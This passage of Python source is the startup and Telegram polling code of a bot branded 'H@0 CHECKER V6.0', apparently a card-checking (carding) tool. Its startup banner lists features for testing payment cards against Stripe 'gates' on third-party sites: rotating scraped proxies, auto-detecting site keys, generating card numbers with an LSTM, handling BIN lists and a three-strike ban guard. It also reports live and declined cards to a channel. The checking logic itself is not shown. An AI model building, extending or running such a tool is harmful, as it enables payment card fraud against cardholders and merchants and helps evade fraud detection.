    asyncio.create_task(auto_scrub_loop(300, _proxy_stats_callback))
    logger.info("Auto proxy scrub started (every 5min)")

    asyncio.create_task(proxy_pool_monitor(check_interval=30, refill_callback=_refill_callback))
    logger.info(f"Proxy pool monitor started (refill when < {REFILL_THRESHOLD} live, target {TARGET_LIVE})")

    try:
        active_cfg_startup = get_config(get_active_config_id()) or {}
        startup_gt = active_cfg_startup.get("gate_type", "stripe").upper()
        gate_icon = "🟢" if active_cfg_startup.get("enabled", False) else "🔴"
        gate_label = "ON" if active_cfg_startup.get("enabled", False) else "OFF"
        ns = get_all_notify()
        n_live = "🟢" if ns['live'] else "🔴"
        n_dec = "🟢" if ns['decline'] else "🔴"
        n_err = "🟢" if ns['errors'] else "🔴"
        all_cfgs = get_all_configs()
        cfg_lines = ""
        for cid_s, cfg_s in all_cfgs.items():
            gt_s = cfg_s.get("gate_type", "stripe").upper()
            en_s = "🟢" if cfg_s.get("enabled") else "🔴"
            site_s = cfg_s.get("settings", {}).get("site_url", "Not set")[:35]
            cfg_lines += f"  #{cid_s} {en_s} {gt_s} · <code>{site_s}</code>\n"

        startup_msg = (
            f"🚀 <b>H@0 CHECKER V6.0</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ Status: <b>ONLINE</b>\n"
            f"🔥 Mode: Direct 24/7 Auto\n\n"
            f"<b>🛡  GATES</b>\n"
            f"{cfg_lines}\n"
            f"<b>🤖  AUTO FEATURES</b>\n"
            f"🔍 Gate type auto-detect\n"
            f"🔑 PK/Token auto-detect\n"
            f"🌐 Proxy auto-scrub (5min)\n"
            f"📊 Auto-refill below {REFILL_THRESHOLD} → {TARGET_LIVE}\n"
            f"🧠 LSTM card gen (auto-retrain)\n"
            f"🛡 Ban guard (3-strike)\n\n"
            f"<b>📊  STATUS</b>\n"
            f"🌐 <code>{get_pool_size()}</code> {'custom' if has_custom_proxies() else 'live'} proxies {'🟢' if is_proxy_enabled() else '🔴'}\n"
            f"📋 <code>{len(crawler.bins)}</code> BINs · 📂 <code>{len(crawler.cc_list)}</code> test cards\n"
            f"🔀 Parallel {'🟢' if is_parallel_enabled() else '🔴'}\n"
            f"🔔 {n_live} Live  {n_dec} Decline  {n_err} Errors\n\n"
            f"📖 /help · /setupgate [url]\n\n"
            f"<code>━━ H@0 V6.0 ━━</code>"
        )
        await bot.send_message(get_active_chat_id(), startup_msg, parse_mode='HTML')
        logger.info("Startup message sent to channel")
    except Exception as e:
        logger.error(f"Startup message failed: {e}")

    asyncio.create_task(checking_loop(bot, get_active_chat_id(), crawler))
    logger.info("Checking loop started as background task")

    logger.info("Clearing old sessions before polling...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("Webhook cleared, pending updates dropped")
    except Exception as e:
        logger.warning(f"Webhook clear failed (non-fatal): {e}")

    await asyncio.sleep(3)

    logger.info("Starting Telegram command polling...")
    max_poll_retries = 10
    for poll_attempt in range(max_poll_retries):
        try:
            await dp.start_polling(reset_webhook=True, timeout=30, relax=0.5)
            break
        except Exception as e:
            err_str = str(e).lower()
            if "terminated by other" in err_str and poll_attempt < max_poll_retries - 1:
                wait = min((poll_attempt + 1) * 3, 15)
                logger.warning(f"Polling conflict (attempt {poll_attempt+1}/{max_poll_retries}) - another bot instance active, retrying in {wait}s...")
                try:
                    await bot.delete_webhook(drop_pending_updates=True)
                except Exception:
                    pass
                await asyncio.sleep(wait)
            else:
                logger.error(f"Polling error: {e}")
                break


if __name__ == '__main__':
    live()
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        logger.info("Bot stopped manually.")
